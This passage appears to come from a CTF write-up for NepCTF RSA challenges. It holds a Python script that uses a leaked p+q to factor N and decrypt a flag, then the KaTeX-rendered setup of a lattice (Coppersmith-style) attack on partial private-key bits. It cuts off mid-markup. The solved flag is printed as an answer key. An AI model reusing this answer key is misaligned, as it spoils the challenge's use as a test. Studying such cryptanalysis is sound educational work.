*</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pq = <span class="number">307418535695879466735463624869957924354358665052136409248678026715718383427120772212039629998693207855281708171850879171131527744317839878812415135610115774273232848128353184128891514282686549164628675031032302196224590402569695631086177519084924289711604045185861705566454491785664136393955640722211793934882</span></span><br><span class="line"></span><br><span class="line">p, q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">res = solve([p*q-N, pq - (p+q)], [p, q])</span><br><span class="line">p, q = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(p*q == N)</span><br><span class="line">e = Integer(e)</span><br><span class="line">p = Integer(p)</span><br><span class="line">d = inverse(e, p-<span class="number">1</span>)</span><br><span class="line">ct = Integer(ct)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(ct, d, p)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># NepCTF&#123;larg3r_M0du1u5_1nf0_g1ves_b3773r_b0und5&#125;</span></span><br></pre></td></tr></table></figure><p><strong>copper</strong></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><strong></strong></p><p><code>p+q</code><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo></mo><mn>1</mn><mo>+</mo><mi>e</mi><mo></mo><msub><mi>k</mi><mn>1</mn></msub><mo></mo><mi>M</mi><mo></mo><msub><mi>k</mi><mn>2</mn></msub><mo></mo><mo stretchy="false">(</mo><mi>N</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo></mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_{low}-1+e*k_{1}*M-k_{2}*(N+1)=k_{2}*(p+q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><br /></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><msub><mi>k</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo></mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo></mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mi>M</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext></mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}1&amp;k_1&amp;-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}1&amp;0&amp;ed_{low}-1\\0&amp;1&amp;eM\\0&amp;0&amp;N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}1&amp;k_1&amp;k_{2}(p+q)\\\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><p><strong></strong><code>k1</code><strong>333</strong><code>k2</code><strong>675</strong><code>k2(p+q)</code><strong>1700</strong></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><msub><mi>k</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo></mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1700</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo></mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1370</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mi>M</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext></mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1700</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mn>1</mn></msub><mo></mo><msup><mn>2</mn><mn>1370</mn></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}1&amp;k_1&amp;-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}2^{1700}&amp;0&amp;ed_{low}-1\\0&amp;2^{1370}&amp;eM\\0&amp;0&amp;N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}2^{1700}&amp;k_1*2^{1370}&amp;k_{2}(p+q)\\\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span 